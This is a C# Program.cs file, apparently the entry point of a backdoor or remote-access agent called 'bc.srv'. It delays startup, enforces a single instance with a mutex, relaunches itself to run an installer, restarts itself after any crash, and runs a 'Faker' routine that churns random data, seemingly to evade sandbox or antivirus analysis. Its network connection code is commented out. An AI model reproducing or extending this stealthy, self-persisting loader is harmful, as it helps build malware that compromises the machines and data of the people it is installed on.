using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Threading;
using bc.srv.Classes;

namespace bc.srv
{
    internal class Program
    {
        public static readonly Random Random = new Random(DateTime.Now.Millisecond);
        public static int Main(string[] args)
        {
            try
            {
                
                
                SrvData.Instance.ServerVersion = "0.2.0";
                CreateStClient.InitializeStClient();
                Thread.Sleep(SrvData.Instance.StartupDelay);
            
                AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;

                using (var mutex = new Mutex(false, SrvData.Instance.sMutex))
                {
                    if (!mutex.WaitOne(0, false))
                        return 6;

                    //Faker();

                    if (args != null && args.Any())
                    {
                        //RunInstallationThread();
                        var installCLass = new InstallClass();
                        installCLass.InstallServer();
                        Faker();
                        Thread.Sleep(50000);
                        Exit(0);
                    }
                    else
                    {
                        var p = new Process();
                        p.StartInfo = new ProcessStartInfo(Assembly.GetExecutingAssembly().Location,"-i");
                        p.Start();
                        //RunConnectionThread();
                    }

                    while (true)
                    {
                        Thread.Sleep(Random.Next(1000,5000));
                    }

                }
            }
            catch (Exception e)
            {
                e.DumpDebugException();
                return 7;
            }
        }

        private static void Faker()
        {
            // if (args != null && args.Any())
            // {
            var rand = Random.Next(10, 850);
            var bytes = new List<byte>();
                
            for (int i = 0; i < 1000; i++)
            {
                bytes.Reverse();
                var bytesSpit = new byte[1024*100];
                Random.NextBytes(bytesSpit);
                bytes.AddRange(bytesSpit);
                        
                // if(rand == i)
                //     RunInstallationThread();
                        
                Thread.Sleep(10);
            }
                    
            // }

        }

        private static void RunConnectionThread()
        {
            var con = new Connection();
            con.StartServer();
        }

        private static void RunInstallationThread()
        {
            var ins = new InstallClass();
            ins.StartInstallThread();
        }

        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            Restart();
        }

        public static void Restart()
        {
            // todo add delay to process start using extternal process cmd
            Process.Start(Assembly.GetExecutingAssembly().Location);
            Exit(1);
        }

        public static void Exit(int code)
        {
            $"Exit code: {code}".DebugLog();
            Environment.Exit(code);
        }
    }
}